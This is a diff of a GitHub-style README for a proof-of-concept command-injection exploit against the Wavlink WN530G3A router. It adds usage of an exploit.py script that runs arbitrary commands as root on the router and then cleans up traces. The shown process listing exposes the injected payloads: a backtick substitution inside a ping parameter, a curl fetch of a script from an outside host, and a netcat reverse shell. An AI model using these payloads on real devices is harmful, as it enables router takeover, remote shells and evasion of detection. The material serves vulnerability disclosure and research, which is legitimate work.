@@ -1,4 +1,4 @@
-# Wavlink-WN530G3-Cmd-Injection-RCE
+# Wavlink-WN530G3A-Cmd-Injection-RCE
 This repo details the proof of concept exploit code for the Wavlink WN530G3 router
 
 # Command Injection in Wavlink WN530G3A
@@ -222,6 +222,101 @@ wireless.cgi
     5 rootws       0 SW   [khelper]
     8 rootws       0 SW   [async/mgr]
   102 rootws       0 SW   [sync_supers]
+````
+## Auto Exploitation
+- Use the `exploit.py` script contained in this repo.
+- The exploit script will run user provided commands on the target router. It will then display the output of those commands. Afterwards it will clean up the file created on target.
+````
+python3 exploit.py -u http://127.0.0.1 -p adminadmin -s "id; ls; ps"
+[+] Target is up...
+[+] Authentication successful, got session id:
+        session=489603400; Path=/
+[+] Attempting to inject target
+[+] Attempting to retrieve command output: 
+uid=0(rootws) gid=0(root) groups=0(root),10
+ExportAllSettings.cgi
+adm.cgi
+applogin.cgi
+ddns.cgi
+firewall.cgi
+login.cgi
+nas.cgi
+nightled.cgi
+openvpn.cgi
+qos.cgi
+staticlist.cgi
+upload.cgi
+uploadVpn.cgi
+upload_settings.cgi
+wireless.cgi
+  PID USER       VSZ STAT COMMAND
+    1 rootws    1936 S    init
+    2 rootws       0 SW   [kthreadd]
+    3 rootws       0 SW   [ksoftirqd/0]
+    4 rootws       0 SW   [events/0]
+    5 rootws       0 SW   [khelper]
+    8 rootws       0 SW   [async/mgr]
+  102 rootws       0 SW   [sync_supers]
+  104 rootws       0 SW   [bdi-default]
+  105 rootws       0 SW   [kblockd/0]
+  113 rootws       0 SW   [kseriod]
+  138 rootws       0 SW   [rpciod/0]
+  149 rootws       0 SW   [kswapd0]
+  150 rootws       0 SW   [aio/0]
+  151 rootws       0 SW   [nfsiod]
+  153 rootws       0 SW   [crypto/0]
+  335 rootws       0 SW   [scsi_tgtd/0]
+  341 rootws       0 SW   [mtdblockd]
+  378 rootws    1928 S    /sbin/syslogd -n
+  382 rootws    1924 S    /sbin/klogd -n
+  398 rootws    6952 S    /usr/sbin/haveged -w 1024 -r 0
+  405 rootws    1024 S    dcron -L /dev/null
+  411 rootws    1284 S    /usr/sbin/dropbear -p 22222 -R
+  422 rootws    1052 S    /sbin/agetty -p -L ttyS0 115200 vt100
+  423 rootws    1308 S    /usr/sbin/dropbear -p 22222 -R
+  424 rootws    1944 S    -sh
+  444 rootws    3552 S    {run-init} /bin/bash ./run-init
+  460 rootws    1296 S    /bin/sh /.emux/emuxinit
+  864 rootws    1296 S    /bin/sh /usr/sbin/check_wan_status.sh
+  928 rootws    1308 S    /usr/sbin/dropbear -p 22222 -R
+  933 rootws    1944 S    -sh
+  992 rootws    1308 S    /bin/sh /bin/curl.sh
+ 1015 rootws    1412 S    /sbin/procd
+ 1017 rootws       0 Z    [procd]
+ 1069 rootws    3548 S    {run-binsh} /bin/bash ./run-binsh
+ 1081 rootws    1296 S    /bin/sh /.emux/emuxshell
+ 1082 rootws    1308 S    /bin/sh
+ 9369 rootws    1300 S    /bin/sh /usr/sbin/check_dnsmasq.sh
+ 9388 rootws    1304 S    /bin/sh /usr/sbin/check_network_status.sh
+ 9416 rootws    5800 S    /usr/sbin/lighttpd -f /etc/lighttpd/lighttpd.conf
+10150 rootws    1308 S    /usr/sbin/dropbear -p 22222 -R
+10151 rootws    1944 S    -sh
+10246 rootws    1308 S    /usr/sbin/dropbear -p 22222 -R
+10252 rootws    1952 S    -sh
+11466 rootws       0 SW   [flush-0:13]
+12393 rootws    1932 S    /bin/sh -c sleep 30; /root/test-eth0.sh >/dev/null 2
+12394 rootws    1932 S    /bin/sh -c sleep 40; /root/test-eth0.sh >/dev/null 2
+12395 rootws    1932 S    /bin/sh -c sleep 50; /root/test-eth0.sh >/dev/null 2
+12397 rootws    1924 S    sleep 40
+12398 rootws    1924 S    sleep 50
+12402 rootws    1924 S    sleep 30
+12431 rootws    1296 S    sleep 30
+12533 rootws    1296 S    sleep 5
+12540 rootws    1296 S    sleep 5
+12545 rootws    1296 S    sleep 2
+12567 rootws    1224 S    /etc/lighttpd/www/cgi-bin/adm.cgi
+12570 rootws    1296 S    sh -c ping "127.0.0.1`(/bin/sh -c 'id; ls; ps' >> /e
+12571 rootws    1296 R    ps
+19715 rootws    4312 S    socat -v TCP-LISTEN:8000,reuseaddr,fork TCP:172.29.1
+22213 rootws    1032 S    nc -nlvp 8888
+22742 rootws    1224 S    /etc/lighttpd/www/cgi-bin/adm.cgi
+22745 rootws    1296 S    sh -c ping "127.0.0.1`(curl http://192.168.100.2:800
+22746 rootws    1296 S    /bin/sh /tmp/shell.sh
+22752 rootws    1296 S    cat /tmp/f
+22753 rootws    1296 S    sh -i
+22754 rootws    1296 S    nc 192.168.100.2 8888
+
+[+] Attempting to clean IOCs left from inject
 ````
 
 
